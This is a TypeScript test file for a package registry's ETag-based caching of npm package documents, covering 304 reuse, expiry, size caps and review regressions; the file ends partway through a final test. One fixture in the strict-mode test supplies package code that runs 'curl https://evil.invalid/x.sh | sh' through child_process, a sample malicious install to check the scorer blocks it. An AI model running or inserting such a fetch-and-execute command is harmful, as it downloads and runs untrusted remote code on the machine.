// What a resolve keeps of each upstream package it reads (upstream_choices, migration 0021): the versions each choice
// took, with npm's ETag for the packument. A later resolve asks npm with If-None-Match and, on a 304, answers from the
// kept row without reading the packument. On 2026-11-15 a resolve of next read all 118 MB of its tree's packuments on
// every request (17 to 22 s on production). npm is a local stand-in that sends an ETag and answers 304 as
// registry.npmjs.org does; the store is the real Postgres one.
import { describe, expect, spyOn, test } from "bun:test";
import { createHash } from "node:crypto";
import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { Effect, Layer, Option } from "effect";
import { Client } from "pg";
import { z } from "zod";
import { analyze, PREVIOUS_SCORER, SCORER, type Analysis as Scored } from "@apm/core";
import { freshDatabase } from "../../../tests/acceptance/postgres.ts";
import { Analysis } from "../src/analysis.ts";
import { apmRoute, OVER_BUDGET_TEXT, resolveResponse, ResolveWait, scanResponse, upstreamRoute } from "../src/apm.ts";
import { Auth } from "../src/auth.ts";
import { Blobs } from "../src/blobs.ts";
import { Clock } from "../src/clock.ts";
import { RegistryConfig } from "../src/config.ts";
import { KEPT_CHOICES_INSERT_LOCK, Store, type StoreApi, type VersionRecord } from "../src/db.ts";
import { digestLabel, digestOf } from "../src/digest.ts";
import { StoreError } from "../src/errors.ts";
import { ChoicesWriter, driverWriteBytes, keepPlans, KEPT_CHOICES_MAX_AGE_MS, KEPT_CHOICES_MAX_CHOICES, KEPT_CHOICES_MAX_TEXT, keptPlan, KeptSide, KEPT_TEXT_WEIGHTS, utf8Bytes } from "../src/kept-choices.ts";
import { KEPT_VERSIONS, pageExists, summarize } from "../src/kept-package.ts";
import { MemoryPool, RequestMemory, type Lease } from "../src/memory.ts";
import { KnownMalicious } from "../src/osv.ts";
import { NPM_FAILURE_MS, Upstream } from "../src/upstream.ts";
import { keptSummary } from "../src/walk-catalog.ts";
import { measured } from "./pg-proxy.ts";

const NOW = Date.parse("2026-11-12T00:00:00Z");
const DAY = 86_400_000;
const MINUTE = 60_000;
const encoder = new TextEncoder();

type Doc = { name: string; version: string; main: string; license: string; dependencies?: Record<string, string> };

const integrityOf = (id: string): string => `sha512-${createHash("sha512").update(id).digest("base64")}`;

/**
 * npm, standing in: packuments with an ETag each, a 304 for a matching If-None-Match, and a switch to fail one. A
 * `name@version` in `bare` lists no checksum; one in `times` was published then (else a day apart, the last 20 days ago).
 */
function fakeNpm(initial: Record<string, Doc[]>) {
  const docs = new Map(Object.entries(initial));
  const failing = new Set<string>();
  const bare = new Set<string>();
  const times = new Map<string, number>();
  const tags = new Map<string, Record<string, string>>();
  const seen = { bodies: 0, notModified: 0 };

  const textOf = (name: string): string | null => {
    const vs = docs.get(name);

    if (!vs) return null;

    const versions = Object.fromEntries(
      vs.map((d) => {
        const tarball = `https://npm.invalid/${name}/-/${name}-${d.version}.tgz`;

        return [d.version, { ...d, dist: bare.has(`${name}@${d.version}`) ? { tarball } : { tarball, shasum: "1".repeat(40), integrity: integrityOf(`${name}@${d.version}`) } }];
      }),
    );

    const time = Object.fromEntries(vs.map((d, i) => [d.version, new Date(times.get(`${name}@${d.version}`) ?? NOW - (20 - i) * DAY).toISOString()]));

    return JSON.stringify({ name, "dist-tags": { ...tags.get(name), latest: vs.at(-1)?.version ?? "" }, versions, time });
  };

  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req): Response {
      const name = decodeURIComponent(new URL(req.url).pathname.slice(1));

      if (failing.has(name)) return new Response("unavailable", { status: 503 });
      const text = textOf(name);

      if (text === null) return Response.json({ error: "Not found" }, { status: 404 });
      const etag = `"${createHash("md5").update(text).digest("hex")}"`;

      if (req.headers.get("if-none-match") === etag) {
        seen.notModified++;

        return new Response(null, { status: 304, headers: { etag } });
      }

      seen.bodies++;

      return new Response(text, { headers: { "content-type": "application/json", etag } });
    },
  });

  return { url: server.url.href, docs, failing, bare, times, tags, seen, stop: () => server.stop(true) };
}

const noBlobs = Layer.succeed(
  Blobs,
  Blobs.of({ put: () => Effect.void, stream: () => Effect.succeed(Option.none()), bytes: () => Effect.succeed(Option.none()), exists: () => Effect.succeed(false), remove: () => Effect.void }),
);

const Body = z
  .object({
    version: z.string().nullish(),
    tree: z.object({ packages: z.array(z.object({ name: z.string(), version: z.string() })), blocks: z.array(z.object({ name: z.string() })), unavailable: z.array(z.object({ dependency: z.string() })) }).loose().optional(),
    warnings: z.array(z.object({ name: z.string(), kind: z.string() })).optional(),
  })
  .loose();

const settings = (npm: string) => ({ baseUrl: "http://registry.test/", webUrl: "http://web.test/", upstreamUrl: npm, legacyAuth: false, namePolicy: "open", admins: [] }) as const;

/** The OSSF feed, standing in: it lists each `name@version` of `listed` under MAL-TEST, and no advisory of a name. */
const feedListing = (listed: readonly string[]) =>
  Layer.succeed(
    KnownMalicious,
    KnownMalicious.of({
      lookup: (pkgs) => Effect.succeed(pkgs.filter((p) => listed.includes(`${p.name}@${p.version}`)).map((p) => ({ name: p.name, version: p.version, ids: ["MAL-TEST"] }))),
      advisoriesFor: () => Effect.succeed([]),
    }),
  );

/** Every service a request uses here: a memory pool of its own, as a new isolate's, or `lease`; the store wrapped by `store`. */
function rigLayers(input: { url: string; npm: string; at?: number; store?: (s: StoreApi) => StoreApi; lease?: Lease; listed?: readonly string[] }) {
  const at = input.at ?? NOW;
  const wrap = input.store ?? ((s: StoreApi) => s);
  const memory = input.lease === undefined ? RequestMemory.layer(new MemoryPool()) : Layer.succeed(RequestMemory, input.lease);
  const feed = input.listed === undefined ? Layer.empty : feedListing(input.listed);
  const base = Layer.mergeAll(Store.postgres(input.url), Clock.fixed({ now: at, wallNow: at }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, { maxMs: 0, pollMs: 1 }), Layer.succeed(RegistryConfig, settings(input.npm)), memory, feed);

  // the wrapped store is the one every service is built with, the upstream reader included
  const wrapped = Layer.provideMerge(
    Layer.effect(
      Store,
      Effect.gen(function* () {
        return Store.of(wrap(yield* Store));
      }),
    ),
    base,
  );

  return Layer.provideMerge(Upstream.layer(input.npm, 60_000, null), wrapped);
}

/**
 * A resolve of `name` (`range`, latest by default) at `at` (NOW by default), with rigLayers; with `listed`, the OSSF
 * feed listing those.
 */
async function resolve(input: { url: string; npm: string; name: string; strict?: boolean; at?: number; range?: string; store?: (s: StoreApi) => StoreApi; lease?: Lease; listed?: readonly string[] }) {
  const params = new URLSearchParams({ name: input.name, range: input.range ?? "latest" });

  if (input.strict) params.set("strict", "1");
  const program = Effect.flatMap(resolveResponse(new URL(`http://registry.test/-/apm/v1/resolve?${params}`)), (res) => Effect.promise(async () => ({ status: res.status, text: await res.text() })));
  const out = await Effect.runPromise(program.pipe(Effect.provide(rigLayers(input)), Effect.scoped));

  return { status: out.status, text: out.text, body: Body.parse(JSON.parse(out.text)) };
}

function doc(name: string, version: string, dependencies?: Record<string, string>): Doc {
  const d: Doc = { name, version, main: "index.js", license: "MIT" };

  if (dependencies) d.dependencies = dependencies;

  return d;
}

const TREE = { app: [doc("app", "1.0.0", { dep: "^1.0.0", risky: "^1.0.0" })], dep: [doc("dep", "1.0.0"), doc("dep", "2.0.0")], risky: [doc("risky", "1.0.0")] };

async function withRig(fn: (rig: { url: string; npm: ReturnType<typeof fakeNpm>; sql: (q: string, p?: unknown[]) => Promise<unknown[]> }) => Promise<void>): Promise<void> {
  const db = await freshDatabase();
  const npm = fakeNpm(TREE);
  const c = new Client({ connectionString: db.url });

  await c.connect();

  try {
    await fn({ url: db.url, npm, sql: async (q, p = []) => (await c.query(q, p)).rows });
  } finally {
    await c.end();
    npm.stop();
    await db.drop();
  }
}

/** Stores an analysis of `name@version`; with `code`, the code it read. */
async function scored(sql: (q: string, p?: unknown[]) => Promise<unknown[]>, name: string, version: string, code = "module.exports = 1;\n"): Promise<void> {
  const m = doc(name, version);
  const file = (path: string, text: string) => ({ path, size: text.length, mode: 0o644, data: encoder.encode(text) });
  const analysis = analyze({ name, manifest: m, files: [file("package.json", JSON.stringify(m)), file("index.js", code)], publisher: "u", previousPublishers: [] });
  const d = digestOf({ integrity: integrityOf(`${name}@${version}`), shasum: "" });

  if (!d) throw new Error("no digest");
  await sql(`INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ($1, $2, $3, $4, $5::jsonb, 0)`, [name, version, digestLabel(d), SCORER, JSON.stringify(analysis)]);
}

describe("kept choices: npm's 304 answers a resolve without its packuments", () => {
  test("a second resolve reads no packument, and answers as the first did", () =>
    withRig(async ({ url, npm, sql }) => {
      for (const [n, v] of [["app", "1.0.0"], ["dep", "1.0.0"], ["risky", "1.0.0"]] as const) await scored(sql, n, v);
      const first = await resolve({ url, npm: npm.url, name: "app" });
      const bodies = npm.seen.bodies;
      const second = await resolve({ url, npm: npm.url, name: "app" });

      expect(first.status).toBe(200);
      expect(first.body.tree?.packages).toEqual([
        { name: "dep", version: "1.0.0" },
        { name: "risky", version: "1.0.0" },
      ]);
      expect(npm.seen.bodies).toBe(bodies);
      expect(npm.seen.notModified).toBeGreaterThanOrEqual(3);
      expect(second.text).toBe(first.text);
      // one row for each document npm was asked for: this upstream's URL of each package
      expect(await sql(`SELECT document FROM upstream_choices ORDER BY document`)).toEqual(["app", "dep", "risky"].map((n) => ({ document: `${npm.url}${n}` })));
    }));

  test("a version npm publishes in range meanwhile is picked: its new ETag reads the packument again", () =>
    withRig(async ({ url, npm }) => {
      await resolve({ url, npm: npm.url, name: "app" });
      npm.docs.set("dep", [doc("dep", "1.0.0"), doc("dep", "1.5.0"), doc("dep", "2.0.0")]);
      const after = await resolve({ url, npm: npm.url, name: "app" });

      expect(after.body.tree?.packages).toContainEqual({ name: "dep", version: "1.5.0" });
    }));

  test("npm failing for a dependency is unavailable, never answered from its kept row, which stays for later", () =>
    withRig(async ({ url, npm, sql }) => {
      const first = await resolve({ url, npm: npm.url, name: "app" });
      const kept = await sql(`SELECT etag, kept FROM upstream_choices WHERE document = $1`, [`${npm.url}dep`]);
      npm.failing.add("dep");
      const down = await resolve({ url, npm: npm.url, name: "app", strict: true });

      expect(down.status).toBe(503);
      expect(down.body).toMatchObject({ unavailable: [{ dependency: "dep@^1.0.0" }] });
      expect(await sql(`SELECT etag, kept FROM upstream_choices WHERE document = $1`, [`${npm.url}dep`])).toEqual(kept);
      npm.failing.delete("dep");
      // npm failed a small read for dep: for NPM_FAILURE_MS its reads go straight to the whole packument (package
      // pages' failure mark), and the answer is the same
      const bodies = npm.seen.bodies;
      const marked = await resolve({ url, npm: npm.url, name: "app" });

      expect(npm.seen.bodies - bodies).toBe(1);
      expect(marked.text).toBe(first.text);
      // past the mark, the kept row answers npm's 304 again
      const wall = Date.now() + NPM_FAILURE_MS + 1_000;
      const date = spyOn(Date, "now").mockImplementation(() => wall);

      try {
        const again = npm.seen.bodies;
        const back = await resolve({ url, npm: npm.url, name: "app" });

        expect(npm.seen.bodies).toBe(again);
        expect(back.text).toBe(first.text);
      } finally {
        date.mockRestore();
      }
    }));

  test("strict mode still refuses a low score answered from a kept row", () =>
    withRig(async ({ url, npm, sql }) => {
      await scored(sql, "app", "1.0.0");
      await scored(sql, "dep", "1.0.0");
      await scored(sql, "risky", "1.0.0", "require('child_process').execSync('curl https://evil.invalid/x.sh | sh');\n");
      const first = await resolve({ url, npm: npm.url, name: "app", strict: true });
      const bodies = npm.seen.bodies;
      const second = await resolve({ url, npm: npm.url, name: "app", strict: true });

      expect(first.status).toBe(422);
      expect(first.body.tree?.blocks.map((b) => b.name)).toEqual(["risky"]);
      expect(npm.seen.bodies).toBe(bodies);
      expect(second.status).toBe(422);
      expect(second.text).toBe(first.text);
    }));

  test("a choice past its hour is not answered from: the packument is read whole again, and the choice made anew", () =>
    withRig(async ({ url, npm, sql }) => {
      const first = await resolve({ url, npm: npm.url, name: "app" });
      const bodies = npm.seen.bodies;
      const again = await resolve({ url, npm: npm.url, name: "app", at: NOW + 60 * MINUTE });
      // every choice was made at NOW, so an hour on none of them answers
      const times = z.array(z.object({ at: z.coerce.number() })).parse(await sql(`SELECT (l.value->>'at')::bigint AS at FROM upstream_choices, jsonb_each(kept->'lists') AS l`));

      expect(npm.seen.bodies - bodies).toBe(3);
      expect(again.text).toBe(first.text);
      expect(times.length).toBeGreaterThan(0);
      expect(times.every((x) => x.at === NOW + 60 * MINUTE)).toBe(true);
    }));

  test("the table holds no more rows than its capacity, and a full table still replaces a row it has", () =>
    withRig(async ({ url, sql }) => {
      const kept = (n: string) => ({ document: n, etag: `"${n}"`, text: JSON.stringify({ distTags: {}, lists: {}, records: {} }) });
      const run = <A>(f: Effect.Effect<A, unknown, Store>) => Effect.runPromise(f.pipe(Effect.provide(Store.postgres(url)), Effect.scoped));

      await run(Effect.flatMap(Store, (s) => s.keepChoices({ rows: [kept("a"), kept("b"), kept("c")], at: 1, capacity: 2, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })));
      expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 2 }]);
      await run(Effect.flatMap(Store, (s) => s.keepChoices({ rows: [{ ...kept("a"), etag: `"a2"` }, kept("d")], at: 2, capacity: 2, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })));
      expect(await sql(`SELECT document, etag FROM upstream_choices ORDER BY document`)).toEqual([
        { document: "a", etag: `"a2"` },
        { document: "b", etag: `"b"` },
      ]);
      // a row past maxBytes as stored is never kept, nor does it replace one
      await run(Effect.flatMap(Store, (s) => s.keepChoices({ rows: [{ document: "a", etag: `"a3"`, text: JSON.stringify({ distTags: { big: "x".repeat(200) }, lists: {}, records: {} }) }], at: 3, capacity: 2, maxBytes: 100, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })));
      expect(await sql(`SELECT etag FROM upstream_choices WHERE document = 'a'`)).toEqual([{ etag: `"a2"` }]);
      // a read is sent no more rows than its allowance holds
      const rows = await run(Effect.flatMap(Store, (s) => s.keptChoicesOf({ documents: ["a", "b"], allowance: 1, weights: KEPT_TEXT_WEIGHTS, at: 3 })));
      expect(rows).toEqual([]);
      const both = await run(Effect.flatMap(Store, (s) => s.keptChoicesOf({ documents: ["a", "b"], allowance: 1_000_000, weights: KEPT_TEXT_WEIGHTS, at: 3 })));
      expect(both.map((r) => r.document)).toEqual(["a", "b"]);
    }));
});

// Review of 3aacc2a: seven P2 findings, the first six here; each of these failed on 3aacc2a.
describe("kept choices: review of 3aacc2a", () => {
  /** An npm that answers every package with one version and always the same ETag, and 304 for it. */
  const fixedEtagNpm = (version: () => string) =>
    Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: (req) => {
        if (req.headers.get("if-none-match") === `"fixed"`) return new Response(null, { status: 304, headers: { etag: `"fixed"` } });
        const v = version();
        const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf(`app@${v}`) };

        return Response.json({ name: "app", "dist-tags": { latest: v }, versions: { [v]: { ...doc("app", v), dist } }, time: { [v]: new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `"fixed"` } });
      },
    });

  test("finding 1: a row kept for one upstream never answers another's 304, though both send the same ETag", async () => {
    const db = await freshDatabase();
    const a = fixedEtagNpm(() => "1.0.0");
    const b = fixedEtagNpm(() => "2.0.0");

    try {
      const first = await resolve({ url: db.url, npm: a.url.href, name: "app" });
      const second = await resolve({ url: db.url, npm: b.url.href, name: "app" });

      expect(first.body.version).toBe("1.0.0");
      // on 3aacc2a: 1.0.0, upstream a's choice, answered for upstream b's 304
      expect(second.body.version).toBe("2.0.0");
    } finally {
      await a.stop(true);
      await b.stop(true);
      await db.drop();
    }
  });

  test("finding 2: a whole read under the same ETag does not make an older choice young again", async () => {
    const db = await freshDatabase();
    let version = "1.0.0";
    const npm = fixedEtagNpm(() => version);
    const HOUR = 60 * 60_000;

    try {
      expect((await resolve({ url: db.url, npm: npm.url.href, name: "app" })).body.version).toBe("1.0.0");
      // a mirror that keeps its ETag while its packument changes
      version = "2.0.0";
      // a whole read for another choice, past the first choice's hour
      expect((await resolve({ url: db.url, npm: npm.url.href, name: "app", range: "*", at: NOW + HOUR + MINUTE })).body.version).toBe("2.0.0");
      // on 3aacc2a: 1.0.0 again, the first choice answered from the row the whole read made young
      expect((await resolve({ url: db.url, npm: npm.url.href, name: "app", at: NOW + HOUR + 2 * MINUTE })).body.version).toBe("2.0.0");
    } finally {
      await npm.stop(true);
      await db.drop();
    }
  });

  test("finding 3: keeping choices never costs the answer: chosen finds what summaries finds under the same lease", () =>
    withRig(async ({ url, npm, sql }) => {
      npm.docs.set("app", [Object.assign(doc("app", "1.0.0"), { scripts: { install: "x".repeat(4000) } })]);
      const pool = new MemoryPool();
      const layers = Layer.provideMerge(Upstream.layer(npm.url, 60_000, null), Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), noBlobs, Layer.succeed(RegistryConfig, settings(npm.url))));

      const read = async (how: "chosen" | "summaries", limit: number) => {
        const lease = pool.request(limit);

        try {
          const program = Effect.flatMap(Upstream, (up) =>
            how === "chosen"
              ? up.chosen({ names: ["app"], lease, choices: () => [{ key: "all", choose: (pkg) => pkg.versions }], keep: (c, r) => keptSummary({ kind: "upstream", name: c.name, distTags: c.distTags, versions: [...(c.versions.get("all") ?? [])] }, r), analyses: "whole" })
              : up.summaries(["app"], lease, (pkg, r) => keptSummary({ kind: "upstream", name: pkg.name, distTags: pkg.distTags, versions: pkg.versions }, r)),
          );

          return (await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.provideService(RequestMemory, lease), Effect.scoped))).get("app")?.kind;
        } finally {
          lease.release();
        }
      };

      // warm: the isolate cache has the package
      await read("summaries", 1_000_000);
      const lost: number[] = [];

      for (const limit of [15_000, 20_000, 25_000, 30_000, 35_000, 40_000]) {
        await sql(`DELETE FROM upstream_choices`);
        const plain = await read("summaries", limit);
        const kept = await read("chosen", limit);

        if (plain === "found" && kept !== "found") lost.push(limit);
      }

      // on 3aacc2a: [20000, 25000, 30000, 35000], the row's pending write taking the answer's room
      expect(lost).toEqual([]);
    }));

  test("finding 4: a row's text is never built before what it holds is reserved", () => {
    const pool = new MemoryPool();
    const lease = pool.request(1024);
    const original = JSON.stringify.bind(JSON);
    const unreserved: number[] = [];

    // every serialization while a row is planned is checked: what the pool holds must cover it, at two bytes a character
    const spy = spyOn(JSON, "stringify").mockImplementation((value) => {
      const text = original(value);

      if (pool.charged < 2 * text.length) unreserved.push(text.length);

      return text;
    });

    try {
      const plan = (distTags: Record<string, string>, on: Lease) => keptPlan({ document: "http://npm.test/app", etag: `"v1"`, distTags, versions: new Map(), reserve: on, at: NOW });

      expect(plan({ latest: "1.0.0", huge: "x".repeat(70_000) }, lease)).toBeNull();
      // on 3aacc2a: one 70,065-character text built with nothing reserved
      expect(unreserved).toEqual([]);
      expect(lease.taken).toBe(0);
      // dist-tags under the cap that do not fit the lease: refused before the text is built
      expect(plan({ latest: "1.0.0", big: "x".repeat(20_000) }, lease)).toBeNull();
      expect(unreserved).toEqual([]);
      expect(lease.taken).toBe(0);
      // and with room, built under its reservation, which settles to the plan's one charge: at least its UTF-8 bytes
      const roomy = pool.request();
      const kept = plan({ latest: "1.0.0", big: "x".repeat(20_000) }, roomy);

      expect(unreserved).toEqual([]);
      expect(kept?.text.length).toBeGreaterThan(20_000);
      expect(roomy.taken).toBe(kept?.weight ?? -1);
      expect(kept?.weight ?? 0).toBeGreaterThanOrEqual(utf8Bytes(kept?.text ?? ""));
      roomy.release();
    } finally {
      spy.mockRestore();
      lease.release();
    }
  });

  test("finding 5: no write keeps more than the cap of choices, even all from one read", () =>
    withRig(async ({ url, npm, sql }) => {
      const dependencies = Object.fromEntries(Array.from({ length: KEPT_CHOICES_MAX_CHOICES + 1 }, (_, i) => [`alias${i}`, `npm:dep@>=1.0.0 <${i + 2}.0.0`]));
      npm.docs.set("app", [doc("app", "1.0.0", dependencies)]);
      const answer = await resolve({ url, npm: npm.url, name: "app" });
      const most = await sql(`SELECT coalesce(max((SELECT count(*) FROM jsonb_object_keys(kept->'lists'))), 0)::int AS n FROM upstream_choices`);

      expect(answer.status).toBe(200);
      // on 3aacc2a: 17
      expect(z.array(z.object({ n: z.number() })).parse(most)[0]?.n ?? 0).toBeLessThanOrEqual(KEPT_CHOICES_MAX_CHOICES);
    }));

  test("finding 6: the row cap counts the bytes Postgres stores, not UTF-16 units", () =>
    withRig(async ({ url, npm, sql }) => {
      npm.docs.set("app", [Object.assign(doc("app", "1.0.0"), { scripts: { install: "漢".repeat(23_000) } })]);
      const answer = await resolve({ url, npm: npm.url, name: "app" });
      const biggest = await sql(`SELECT coalesce(max(octet_length(kept::text)), 0)::int AS bytes FROM upstream_choices`);

      expect(answer.status).toBe(200);
      // on 3aacc2a: 69,677 bytes kept
      expect(z.array(z.object({ bytes: z.number() })).parse(biggest)[0]?.bytes ?? 0).toBeLessThanOrEqual(KEPT_CHOICES_MAX_TEXT);
    }));
});

// Re-check of 3366a36: each of these failed on 3366a36.
describe("kept choices: re-check of 3366a36", () => {
  /** Upstream.chosen against Upstream.summaries for `names`, each keeping every version, under a request lease of `limit`. */
  const reader = (url: string, npmUrl: string, names: readonly string[], at: () => number = () => NOW) => {
    const pool = new MemoryPool();
    const layers = (now: number) => Layer.provideMerge(Upstream.layer(npmUrl, 60_000, null), Layer.mergeAll(Store.postgres(url), Clock.fixed({ now, wallNow: now }), noBlobs, Layer.succeed(RegistryConfig, settings(npmUrl))));

    return async (how: "chosen" | "summaries", limit: number, key = "all"): Promise<number> => {
      const lease = pool.request(limit);

      try {
        const program = Effect.flatMap(Upstream, (up) =>
          how === "chosen"
            ? up.chosen({ names, lease, choices: () => [{ key, choose: (pkg) => pkg.versions }], keep: (c, r) => keptSummary({ kind: "upstream", name: c.name, distTags: c.distTags, versions: [...(c.versions.get(key) ?? [])] }, r), analyses: "whole" })
            : up.summaries(names, lease, (pkg, r) => keptSummary({ kind: "upstream", name: pkg.name, distTags: pkg.distTags, versions: pkg.versions }, r)),
        );

        const out = await Effect.runPromise(program.pipe(Effect.provide(layers(at())), Effect.provideService(RequestMemory, lease), Effect.scoped));

        return [...out.values()].filter((s) => s.kind === "found").length;
      } finally {
        lease.release();
      }
    };
  };

  test("finding 1: chosen finds every package summaries finds, at every lease, with no rows and with rows kept", () =>
    withRig(async ({ url, npm, sql }) => {
      const names = Array.from({ length: 8 }, (_, i) => `pkg${i}`);

      for (const n of names) npm.docs.set(n, [Object.assign(doc(n, "1.0.0"), { scripts: { install: "x".repeat(4000) } })]);
      const read = reader(url, npm.url, names);
      // warm: the isolate cache has every package
      await read("summaries", 1_000_000);
      const lost: { limit: number; rows: boolean; plain: number; kept: number }[] = [];

      for (const rows of [false, true]) {
        for (const limit of [15_000, 20_000, 25_000, 30_000, 35_000, 40_000, 45_000, 50_000, 55_000, 60_000, 65_000, 70_000, 80_000, 90_000, 100_000, 120_000]) {
          if (!rows) await sql(`DELETE FROM upstream_choices`);
          const plain = await read("summaries", limit);
          const kept = await read("chosen", limit);

          if (kept < plain) lost.push({ limit, rows, plain, kept });
        }

        // rows for every package, for the sweep with rows kept
        await read("chosen", 1_000_000);
      }

      // on 3366a36: 8 found by summaries and 5 by chosen at 90 KB, and a kept row denying a warm package at 25 to 40 KB
      expect(lost).toEqual([]);
    }));

  test("finding 2: a choice made from the isolate cache is as old as the whole read it came from", () =>
    withRig(async ({ url, npm, sql }) => {
      let wall = NOW;
      const date = spyOn(Date, "now").mockImplementation(() => wall);

      try {
        const shared = reader(url, npm.url, ["app"], () => wall);
        wall = NOW;
        await shared("chosen", 1_000_000, "a");
        // 59 s on, from the isolate cache: no read of npm
        wall = NOW + 59_000;
        await shared("chosen", 1_000_000, "b");
        expect(npm.seen.bodies).toBe(1);
        // an hour after the only whole read, in a new isolate: choice b is that read's, so it no longer answers
        wall = NOW + 60 * MINUTE + 30_000;
        await reader(url, npm.url, ["app"], () => wall)("chosen", 1_000_000, "b");
        const lists = z.array(z.object({ at: z.coerce.number() })).parse(await sql(`SELECT (l.value->>'at')::bigint AS at FROM upstream_choices, jsonb_each(kept->'lists') AS l WHERE l.key = 'b'`));

        // on 3366a36: 1 body, choice b stamped 59 s after the read and answered from a 304
        expect(npm.seen.bodies).toBe(2);
        expect(lists).toEqual([{ at: NOW + 60 * MINUTE + 30_000 }]);
      } finally {
        date.mockRestore();
      }
    }));

  test("finding 3: a weak ETag keeps nothing, so every resolve reads the packument whole", async () => {
    const db = await freshDatabase();
    let bodies = 0;

    const npm = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: (req) => {
        if (req.headers.get("if-none-match") === `W/"weak"`) return new Response(null, { status: 304, headers: { etag: `W/"weak"` } });
        bodies++;
        const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf("app@1.0.0") };

        return Response.json({ name: "app", "dist-tags": { latest: "1.0.0" }, versions: { "1.0.0": { ...doc("app", "1.0.0"), dist } }, time: { "1.0.0": new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `W/"weak"` } });
      },
    });

    const c = new Client({ connectionString: db.url });

    try {
      await resolve({ url: db.url, npm: npm.url.href, name: "app" });
      await resolve({ url: db.url, npm: npm.url.href, name: "app" });
      await c.connect();

      // on 3366a36: one row kept for W/"weak", and the second resolve answered from its 304
      expect((await c.query(`SELECT count(*)::int AS n FROM upstream_choices`)).rows).toEqual([{ n: 0 }]);
      expect(bodies).toBe(2);
    } finally {
      await c.end();
      await npm.stop(true);
      await db.drop();
    }
  });

  test("finding 4: a packument npm redirects is read whole every time, never validated against another document's row", async () => {
    const db = await freshDatabase();
    let target = "one";

    const npm = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: (req) => {
        const path = new URL(req.url).pathname;

        if (path.startsWith("/front/")) return new Response(null, { status: 302, headers: { location: `/${target}/app` } });

        if (req.headers.get("if-none-match") === `"local-revision-1"`) return new Response(null, { status: 304, headers: { etag: `"local-revision-1"` } });
        const version = path.startsWith("/one/") ? "1.0.0" : "2.0.0";
        const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf(`app@${version}`) };

        return Response.json({ name: "app", "dist-tags": { latest: version }, versions: { [version]: { ...doc("app", version), dist } }, time: { [version]: new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `"local-revision-1"` } });
      },
    });

    const c = new Client({ connectionString: db.url });

    try {
      const first = await resolve({ url: db.url, npm: `${npm.url.href}front/`, name: "app" });
      target = "two";
      const second = await resolve({ url: db.url, npm: `${npm.url.href}front/`, name: "app", at: NOW + MINUTE });
      await c.connect();

      expect(first.body.version).toBe("1.0.0");
      // on 3366a36: 1.0.0, /one/app's row answering for /two/app's 304
      expect(second.body.version).toBe("2.0.0");
      // a row is kept only for a document that answered directly
      expect((await c.query(`SELECT count(*)::int AS n FROM upstream_choices`)).rows).toEqual([{ n: 0 }]);
    } finally {
      await c.end();
      await npm.stop(true);
      await db.drop();
    }
  });
});

// Combined review of 67d8658 (climb/resolve-speed-main): each of these failed on 67d8658.
describe("kept choices and kept summaries: combined review of 67d8658", () => {
  /** A one-version packument of `name` as npm sends it, its ETag `etag`. */
  const packumentOf = (name: string, version: string) => {
    const dist = { tarball: `https://npm.invalid/${name}.tgz`, shasum: "1".repeat(40), integrity: integrityOf(`${name}@${version}`) };

    return { name, "dist-tags": { latest: version }, versions: { [version]: { ...doc(name, version), dist } }, time: { [version]: new Date(NOW - 10 * DAY).toISOString() } };
  };

  test("finding 2: a stale summary's check that failed is not tried again by its caller: 2 requests, then 1 while the mark lasts, as on 03be2c3", async () => {
    const db = await freshDatabase();
    let wall = NOW;
    const date = spyOn(Date, "now").mockImplementation(() => wall);
    let down = false;
    const asked: string[] = [];

    const npm = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: (req) => {
        asked.push(req.headers.has("if-none-match") ? "conditional" : "whole");

        if (down) return new Response("down", { status: 503 });

        return Response.json(packumentOf("app", "1.0.0"), { headers: { etag: `"1.0.0"` } });
      },
    });

    const c = new Client({ connectionString: db.url });
    const pool = new MemoryPool();

    const run = <A>(f: Effect.Effect<A, unknown, Upstream | Store | Clock | RequestMemory>) =>
      Effect.runPromise(f.pipe(Effect.provide(Layer.provideMerge(Upstream.layer(npm.url.href, 60_000, null), Layer.mergeAll(Store.postgres(db.url), noBlobs, Clock.fixed({ now: wall, wallNow: wall }), RequestMemory.layer(pool)))), Effect.scoped));

    try {
      await c.connect();
      const first = await run(Effect.flatMap(Upstream, (u) => Effect.flatMap(RequestMemory, (lease) => u.listing("app", lease))));

      if (first.kind !== "found") throw new Error("no package");
      await c.query(`INSERT INTO kept_packages (package, summary, computed_at, asked_at) VALUES ($1, $2::jsonb, $3, $3)`, ["app", JSON.stringify(summarize(first.pkg)), wall - 5 * MINUTE - 1]);
      // past the isolate cache's TTL, npm down
      down = true;
      wall += 61_000;
      const counts: number[] = [];

      for (let i = 0; i < 2; i++) {
        const before = asked.length;
        const got = await run(Effect.flatMap(Upstream, (u) => Effect.flatMap(RequestMemory, (lease) => pageExists({ upstream: u, name: "app", lease }))));

        expect(got).toBe("unknown");
        counts.push(asked.length - before);
      }

      // on 67d8658: [3, 2]; on 03be2c3 a HEAD and a whole read, then a whole read while marked
      expect(counts).toEqual([2, 1]);
    } finally {
      date.mockRestore();
      await c.end();
      await npm.stop(true);
      await db.drop();
    }
  });

  test("finding 3: a conditional read whose 200 cannot be read marks the package, so the next small read does not ask npm", async () => {
